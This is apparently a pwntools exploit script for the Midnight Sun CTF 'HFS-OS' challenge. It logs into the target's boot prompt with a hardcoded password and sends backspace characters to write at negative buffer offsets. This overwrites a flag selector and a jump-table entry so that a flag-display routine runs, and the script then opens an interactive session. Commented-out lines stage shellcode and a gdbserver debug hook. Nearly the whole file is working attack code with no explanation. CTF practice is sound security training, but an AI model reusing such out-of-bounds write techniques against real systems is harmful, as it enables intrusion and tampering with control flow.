from subprocess import check_output
from pwn import *

def debug():
    send('\x01c')
    p.recvuntil('(qemu)')
    p.sendline('gdbserver tcp:192.168.56.1:1234')
    p.recvuntil('(qemu)')
    send('\x01c')

check_output(['nasm', 'exp2.asm'])
exp = open('exp2', 'rb').read()
assert len(exp) < 0x62
exp = exp.replace('\x01', '\x01\x01')
assert '\xf0' not in exp
assert '\x0d' not in exp
assert '\x7f' not in exp
exp = exp.replace('\x00','\xf0')

# Phase 1
p = process('./run')
#p = remote('hfs-os-01.play.midnightsunctf.se', 31337)
p.recvuntil('[HFS_MBR]>')
p.send('sojupwner')
p.sendline()


start     = 0x0100
patch     = 0x01E7
show_flag = 0x014F
buff = 0x39c
jmp_table = 0x389

def send(data):
    for c in data:
        time.sleep(.01)
        p.send(c)
        sys.stdout.write('*')


def write_off(neg_off, data):
    p.recvuntil('[HFS-DOS]>')
    assert(neg_off <= 0)
    send('\x7f' * -neg_off + data + '\x0d')

#def write_base(


write_off(-3, '2') # set FLAG1 to FLAG2
write_off(-19, p16(show_flag)) 
write_off(0, '')

#exp = 'ABCD[\x16\x80]\x0d'
#write_off(patch - buff, '\x03\x0d')
#write_off(start - buff, exp)
#p.recvuntil('ABCD[')
#print(enhex(p.recvuntil(']')))
#
##write_off(jmp_table - buff, p16(start))
#print(p.recv())
#
#
#write_off(0, 'A')
#
#debug()
#raw_input('Press any key to continue')

p.interactive(prompt='')


